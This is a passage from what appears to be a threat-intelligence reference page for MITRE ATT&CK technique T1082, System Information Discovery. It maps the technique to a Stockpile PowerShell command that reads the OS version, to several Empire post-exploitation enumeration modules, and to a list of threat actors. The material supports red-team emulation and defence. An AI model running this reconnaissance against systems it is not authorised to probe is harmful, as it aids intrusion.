                                                        'technique': {'attack_id': 'T1082',
                                                                      'name': 'system '
                                                                              'information '
                                                                              'discovery'}}},
 {'Mitre Stockpile - Find OS Version': {'description': 'Find OS Version',
                                        'id': 'b6b105b9-41dc-490b-bc5c-80d699b82ce8',
                                        'name': 'Find OS Version',
                                        'platforms': {'windows': {'psh': {'command': '[environment]::OSVersion.Version\n'}}},
                                        'tactic': 'discovery',
                                        'technique': {'attack_id': 'T1082',
                                                      'name': 'System '
                                                              'Information '
                                                              'Discovery'}}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1082',
                                            'ATT&CK Technique #2': 'T1005',
                                            'Concatenate for Python Dictionary': '"powershell/situational_awareness/host/computerdetails":  '
                                                                                 '["T1082","T1005"],',
                                            'Empire Module': 'powershell/situational_awareness/host/computerdetails',
                                            'Technique': 'System Information '
                                                         'Discovery'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1082',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/situational_awareness/host/winenum":  '
                                                                                 '["T1082"],',
                                            'Empire Module': 'powershell/situational_awareness/host/winenum',
                                            'Technique': 'System Information '
                                                         'Discovery'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1082',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/situational_awareness/network/powerview/get_computer":  '
                                                                                 '["T1082"],',
                                            'Empire Module': 'powershell/situational_awareness/network/powerview/get_computer',
                                            'Technique': 'System Information '
                                                         'Discovery'}}]
```

# Tactics


* [Discovery](../tactics/Discovery.md)


# Mitigations

None

# Actors


* [Patchwork](../actors/Patchwork.md)

* [Ke3chang](../actors/Ke3chang.md)
    
* [APT37](../actors/APT37.md)
    
* [Gamaredon Group](../actors/Gamaredon-Group.md)
    
* [Honeybee](../actors/Honeybee.md)
    
* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [APT19](../actors/APT19.md)
    
* [admin@338](../actors/admin@338.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Turla](../actors/Turla.md)
    
* [APT32](../actors/APT32.md)
    
* [APT3](../actors/APT3.md)
    
* [Sowbug](../actors/Sowbug.md)
    
* [Darkhotel](../actors/Darkhotel.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [APT18](../actors/APT18.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
